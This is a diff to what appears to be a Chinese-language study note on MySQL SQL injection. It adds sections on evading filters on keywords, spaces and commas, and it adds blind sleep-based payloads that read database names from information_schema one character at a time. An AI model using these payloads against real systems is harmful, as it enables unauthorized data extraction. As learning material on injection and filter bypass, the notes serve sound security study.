@@ -28,6 +28,10 @@
   - [无列名注入](#无列名注入)
   - [insert update delete注入](#insert-update-delete注入)
 - [过滤与替换](#过滤与替换)
+  - [and与or被过滤](#and与or被过滤)
+  - [空格被过滤](#空格被过滤)
+  - [逗号被过滤](#逗号被过滤)
+  - [比较操作符/函数](#比较操作符函数)
 - [未完待续...](#未完待续)
 
 ## 注释
@@ -2142,11 +2146,11 @@ Time: 0.008s
 
 ## 过滤与替换
 
-1. `and or`被过滤
+### and与or被过滤
 
 用`&&`和`||`代替
 
-2. 空格被过滤
+### 空格被过滤
 
 - 用`/*xxx*/`或者`+`(加号有使用限制)作为空格的替换
 
@@ -2201,6 +2205,8 @@ for i in url_char:
 
 - 用`()`和`{}`去闭合从而绕过空格的限制
 
+>`{}`常用于语句变形
+
 样例`select(user),(host)from(mysql.user);`
 
 真实模拟
@@ -2217,7 +2223,7 @@ for i in url_char:
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131742371.png)
 
-3. 逗号被过滤
+### 逗号被过滤
 
 `select 1,2,3;`
 
@@ -2231,9 +2237,39 @@ for i in url_char:
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132047064.png)
 
+`select id,info from table3 union select * from (select group_concat(user) from mysql.user)a join (select group_concat(host) from mysql.user)b;`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151417672.png)
+
+`mid`和`substr`是可以不使用`,`的
+
+```
+select substr('asdfgh',1,2)
+select substr('asdfgh' from 1 for 2)
+mid同理
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151356999.png)
+
+`limit`的逗号可以用`offset`进行替换
+
+`select id,info from table3 limit 1 offset 0`
+
+`select id,info from table3 limit 1 offset 1`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151427591.png)
+
 >假设逗号跟空格(包括替换字符)都不允许出现,同时目标不报错不回显
 
 可以利用之前提到的裸sleep注入
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select ascii(mid(group_concat(schema_name)from(1)for(1)))from(information_schema.schemata))>100))#'`
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select ascii(mid(group_concat(schema_name)from(2)for(1)))from(information_schema.schemata))>100))#'`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151402289.png)
+
+---
 
 `select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'0'and'G'))#'`
 
@@ -2291,9 +2327,20 @@ mysql root@localhost:(none)> select user,host,file_priv from mysql.user where us
 Time: 0.010s
 ```
 
-1. 比较操作符
+### 比较操作符/函数
 
-
+```
+<
+>
+=
+!=
+greatest()
+least()
+between xxx and xxx
+like
+rlike
+regexp
+```
 
 
 
